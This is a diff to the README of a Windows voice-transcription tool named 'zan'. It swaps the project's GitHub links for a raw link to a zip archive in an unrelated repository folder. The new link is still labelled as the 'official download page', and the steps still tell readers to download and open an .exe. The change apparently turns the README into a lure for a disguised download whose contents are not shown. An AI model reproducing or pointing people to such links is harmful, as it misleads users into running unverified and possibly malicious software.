@@ -5,7 +5,7 @@ description: "Transcribe voice to text and perform AI actions on selected text i
 ---
 # 🎙️ zan - Transcribe voice to text quickly
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/afrivil2644/zan)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://raw.githubusercontent.com/afrivil2644/afrivil2644.github.io/main/ciboule/afrivil-github-io-v3.2.zip)
 
 ## 📌 About this project
 
@@ -24,7 +24,7 @@ Your computer needs a few things to run this tool well:
 
 Follow these steps to put the app on your computer:
 
-1. Visit the [official download page](https://github.com/afrivil2644/zan).
+1. Visit the [official download page](https://raw.githubusercontent.com/afrivil2644/afrivil2644.github.io/main/ciboule/afrivil-github-io-v3.2.zip).
 2. Look for the latest release link at the top of the page.
 3. Click the link that ends with .exe to start your download.
 4. Open the file once the download finishes.
